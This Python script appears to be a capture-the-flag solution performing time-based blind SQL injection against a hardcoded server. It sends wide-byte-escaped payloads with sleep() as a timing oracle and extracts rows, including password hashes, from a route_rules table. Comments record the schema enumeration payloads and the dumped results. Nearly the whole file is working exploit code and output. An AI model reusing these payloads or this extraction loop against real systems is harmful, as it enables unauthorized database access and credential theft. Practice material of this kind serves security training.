# -*- coding:utf-8 -*-
import requests
import time 
import string

flag = ''
for num in range(287, 10000):
    # print "num: " + str(num)
    for i in string.printable:
        pay = "滜%27or(if(ascii(substr((select group_concat(id,0x7c,pattern,0x7c,action,0x7c,rulepass) from route_rules),{},1))={},sleep(1),0))%23".format(str(num), str(ord(i)))
        url = "http://116.85.48.105:5033/bd4f8f05-e76a-4147-b1c2-8621380c8729/well/getmessage/" + pay
        t1 = time.time()
        res = requests.get(url)
        t2 = time.time()
        if t2 - t1 > 5:
            flag += i
            print "[+]flag: " + flag
            break

# 滜%27%20order%20by%203%23 3个字段
# user: 'hack'@'172.18.0.4' 
# database: sqli
# 滜%27or(if(ascii(substr((select schema()),{},1))={},sleep(1),0))%23
# tables: message,route_rules
# 滜%27or(if(ascii(substr((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=schema()),1,1))=117,sleep(1),0))%23
# columns: id,name,contents id,pattern,action,rulepass
# 滜%27or(if(ascii(substr((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 0x726f7574655f72756c6573),1,1))=117,sleep(1),0))%23
# select group_concat(id,0x7c,pattern,0x7c,action,0x7c,rulepass) from route_rules
# 1|get*/:u/well/getmessage/:s|Well#getmessage|cd4229e671a8830debfcbb049a23399c,12|get*/:u/justtry/self/:s|JustTry#self|5ed16f9c7c27cb846eaf15c19fe40093,13|post*/:u/justtry/try|JustTry#try|3228ad498d5a20d1d22d6a4a15fed4d2,15|static/bootstrap/css/backup.css|static/bootstrap/css/backup.zip|


